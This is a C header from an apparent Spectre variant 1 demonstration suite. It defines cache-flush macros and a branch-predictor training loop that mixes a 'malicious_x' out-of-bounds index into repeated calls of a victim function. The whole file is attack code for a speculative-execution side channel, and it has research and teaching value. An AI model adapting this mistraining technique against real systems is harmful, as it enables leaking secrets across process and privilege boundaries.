#ifndef WE_SPECTRE_TRAIN_H
#define WE_SPECTRE_TRAIN_H

#include "we_spectre_params.h"

#ifndef NOCLFLUSH
#define WE_TRAIN_FLUSH_BOUNDS() _mm_clflush(&array1_size)
#else
#define WE_CACHE_FLUSH_ITERATIONS 2048
#define WE_CACHE_FLUSH_STRIDE 4096

static void we_flush_memory_sse(uint8_t *address)
{
    float *p = (float *)address;
    __m128 zero = _mm_setzero_ps();
    int k, l;
    for (k = 0; k < 4; ++k)
        for (l = 0; l < 4; ++l)
            _mm_stream_ps(&p[(l * 4 + k) * 4], zero);
}

#define WE_TRAIN_FLUSH_BOUNDS() do { \
    for (l = WE_CACHE_FLUSH_ITERATIONS * WE_CACHE_FLUSH_STRIDE - 1; \
         l >= 0; l -= WE_CACHE_FLUSH_STRIDE) \
        junk2 = cache_flush_array[l]; \
} while (0)
#endif

/* CALL is a complete call expression using x, e.g. victim_function(x).
   j, x, training_x, and malicious_x are locals in each demo's read routine. */
#define WE_TRAIN_CALL(CALL) for (j = WE_TRAIN_CALLS - 1; j >= 0; --j) { \
    WE_TRAIN_FLUSH_BOUNDS(); \
    for (volatile int z = 0; z < WE_TRAIN_DELAY_SPINS; ++z) {} \
    x = ((j % WE_TRAIN_PERIOD) - 1) & ~0xFFFF; \
    x = x | (x >> 16); \
    x = training_x ^ (x & (malicious_x ^ training_x)); \
    CALL; \
}

#endif
